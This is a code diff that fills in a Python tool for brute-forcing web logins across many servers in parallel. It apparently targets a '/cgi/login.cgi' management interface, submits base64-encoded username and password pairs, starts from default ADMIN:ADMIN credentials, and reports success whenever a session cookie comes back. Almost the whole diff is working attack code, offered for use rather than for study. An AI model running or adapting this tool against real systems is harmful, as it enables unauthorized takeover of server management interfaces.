@@ -1,6 +1,9 @@
 #! /usr/bin/env python3
 
+import requests
+from base64 import b64encode
 from datetime import date
+from urllib.parse import quote
 from optparse import OptionParser
 from colorama import Fore, Back, Style
 from multiprocessing import Lock, Pool, cpu_count
@@ -15,6 +18,7 @@ status_color = {
 }
 
 scheme = "http"
+login_endpoint = "/cgi/login.cgi"
 lock = Lock()
 thread_count = cpu_count()
 
@@ -27,9 +31,16 @@ def get_arguments(*args):
         parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
     return parser.parse_args()[0]
 
-def login(server, username='', password=''):
-    pass
-def brute_force(thread_index, servers, credentials):
+def login(server, username='ADMIN', password='ADMIN', scheme="http"):
+    t1 = time()
+    try:
+        response = requests.post(f"{scheme}://{server}{login_endpoint}", data=f"name={quote(b64encode(username.encode()).decode())}&pwd={quote(b64encode(password.encode()).decode())}&check=00", verify=False)
+        authorization_status = True if "Set-Cookie" in response.headers.keys() else False
+        t2 = time()
+        return authorization_status, t2-t1
+    except Exception as error:
+        return error, t2-t1
+def brute_force(thread_index, servers, credentials, scheme="http"):
     successful_logins = {}
     for credential in credentials:
         status = ['']
@@ -46,7 +57,7 @@ def brute_force(thread_index, servers, credentials):
                 with lock:
                     display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
     return successful_logins
-def main(servers, credentials):
+def main(servers, credentials, scheme="http"):
     successful_logins = {}
     pool = Pool(thread_count)
     display('+', f"Starting {Back.MAGENTA}{thread_count} Brute Force Threads{Back.RESET}")
@@ -55,7 +66,7 @@ def main(servers, credentials):
     total_servers = len(servers)
     server_divisions = [servers[group*total_servers//thread_count: (group+1)*total_servers//thread_count] for group in range(thread_count)]
     for index, server_division in enumerate(server_divisions):
-        threads.append(pool.apply_async(brute_force, (index, server_division, credentials)))
+        threads.append(pool.apply_async(brute_force, (index, server_division, credentials, scheme)))
     for thread in threads:
         successful_logins.update(thread.get())
     pool.close()
